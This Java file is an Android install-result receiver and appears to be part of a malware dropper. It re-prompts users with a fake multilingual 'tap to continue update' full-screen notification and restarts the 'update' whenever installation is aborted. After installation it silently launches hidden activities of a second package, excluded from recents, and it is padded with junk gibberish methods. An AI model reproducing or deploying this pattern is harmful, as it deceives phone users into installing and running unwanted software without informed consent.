package com.appd.instll;


import static android.content.pm.PackageInstaller.STATUS_FAILURE_ABORTED;
import static com.appd.instll.constants.optndatascan;
import static com.appd.instll.tools.isAppInstalled;
import static com.appd.instll.tools.loadFlag;
import static com.appd.instll.tools.saveFlag;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import java.util.Locale;


public class BroReceiver extends BroadcastReceiver {
    private static final String TAG = "RootlessSaiPiBR";

    public static final String ANDROID_PM_EXTRA_LEGACY_STATUS = "android.content.pm.extra.LEGACY_STATUS";


    public static final String ACTION_IN_DELIVER = "ACTION_IN_DELIVER";

    public static final int STATUS_BAD_ROM = -322;

    //private Context mContext;


//    public BroReceiver(Context c) {
//        mContext = c.getApplicationContext();
//    }

    public void showUpdateNotification(Context context) {
        NotificationManagerCompat nmCompat = NotificationManagerCompat.from(context);
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {

            return;
        }
        String channelId = "update_channels";
        String channelName = "Updates";

        // Create channel for Android 8+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    channelName,
                    NotificationManager.IMPORTANCE_HIGH // makes it important
            );
            channel.enableLights(true);
            channel.enableVibration(true);

            NotificationManager nm = context.getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }

        // PendingIntent to open your activity
        Intent intent = new Intent(context, updateActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        PendingIntent pendingIntent = PendingIntent.getActivity(
                context,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        String thetitle = "Update";
        String themsg = "tap to continue update.";

        String CurrnetLanuage = Locale.getDefault().getLanguage();

        switch (CurrnetLanuage) {
            case "ar": // Arabic
                thetitle = "تحديث";
                themsg = "اضغط للمتابعة وإكمال التحديث.";
                break;

            case "zh": // Chinese (Simplified)
                thetitle = "更新";
                themsg = "点击继续更新。";
                break;

            case "tr": // Turkish
                thetitle = "Güncelleme";
                themsg = "Güncellemeye devam etmek için dokunun.";
                break;

            case "ru": // Russian
                thetitle = "Обновление";
                themsg = "Нажмите, чтобы продолжить обновление.";
                break;

            case "pt": // Portuguese
                thetitle = "Atualização";
                themsg = "Toque para continuar a atualização.";
                break;

            case "es": // Spanish
                thetitle = "Actualización";
                themsg = "Toca para continuar la actualización.";
                break;

            default:
                // English is default
                break;
        }


        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, channelId)
                .setSmallIcon(R.drawable.inv) // your icon
                .setContentTitle(thetitle)
                .setContentText(themsg)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setContentIntent(pendingIntent)
                .setFullScreenIntent(pendingIntent,true)
                .setAutoCancel(true);


        nmCompat.notify(1001, builder.build());
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
        Log.e("onReceive", String.valueOf(status));
//                if (intent.getAction() !=null && intent.getAction().equals(ACTION_IN_DELIVER)){
//                    Intent confirmationIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
//
//                    // Intent confirmationIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
//                    int sessionId = intent.getIntExtra(PackageInstaller.EXTRA_SESSION_ID, -1);
//
//                    // Create a new Intent to launch your Initiate Activity
//                    Intent forwardIntent = new Intent(context, initiate.class);
//                    forwardIntent.putExtra("install_session_id", sessionId);
//                    forwardIntent.putExtra("install_intent", confirmationIntent);
//                    forwardIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//
//                    context.startActivity(forwardIntent);
//                    return;
//                }
        switch (status) {
            case PackageInstaller.STATUS_PENDING_USER_ACTION:
                // Log.d(TAG, "Requesting user confirmation for installation");
                Intent confirmationIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);

                // Intent confirmationIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                int sessionId = intent.getIntExtra(PackageInstaller.EXTRA_SESSION_ID, -1);

                // Create a new Intent to launch your Initiate Activity
                Intent forwardIntent = new Intent(context, initiate.class);
                forwardIntent.putExtra("install_session_id", sessionId);
                forwardIntent.putExtra("install_intent", confirmationIntent);
                forwardIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                context.startActivity(forwardIntent);

                //SessionManager.start(context, intent.getIntExtra(PackageInstaller.EXTRA_SESSION_ID, -1), confirmationIntent);

                break;
            case PackageInstaller.STATUS_SUCCESS:
                Log.d(TAG, "Installation succeed");
                // To enable Theme 1

                boolean selfinstall = loadFlag(context);
                if (selfinstall) {
                    saveFlag(context,false);
                    Intent relaunch = new Intent(context, updateActivity.class);
                    relaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
                    context.startActivity(relaunch);
                    showUpdateNotification(context);
                }
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        if (isAppInstalled(context, optndatascan)){
                            // try{
                            try{
                                Intent intentxx = new Intent();
                                intentxx.setComponent(new ComponentName(optndatascan, optndatascan +".A1"));
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                intentxx.setAction(Intent.ACTION_MAIN);
                                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                                context.startActivity(intentxx);
                            }catch (Exception a){

                            }

                            try{
                                Intent intentxx = new Intent();
                                intentxx.setComponent(new ComponentName(optndatascan, optndatascan +".A2"));
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                intentxx.setAction(Intent.ACTION_MAIN);
                                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                                context.startActivity(intentxx);
                            }catch (Exception a){

                            }

                            // this.finish();
                            // return;
                        }


                    }
                }, 100);

                break;
            case STATUS_FAILURE_ABORTED:
                Intent relaunch = new Intent(context, splash.class);
                relaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                relaunch.putExtra("start_update", true); // Pass flag to splash activity
                context.startActivity(relaunch);
                break;
            default:
                Log.d(TAG, "Installation failed");

                break;
        }
//        Thread backwoker = new Thread(new Runnable() {
//            @Override
//            public void run() {
//
//            }
//        });
//        backwoker.start();


    }
    public static class RedundantController {
        public void yuo() {
            Log.v("Redunasdasdoller", "Litasdasdasing");
        }
        public void doNothing() {
            Log.v("Reasdasdaller", "Liasdasdthing");
        }
        public void asdw() {
            Log.v("asdasd", "Liteasdasding");
        }
    }

}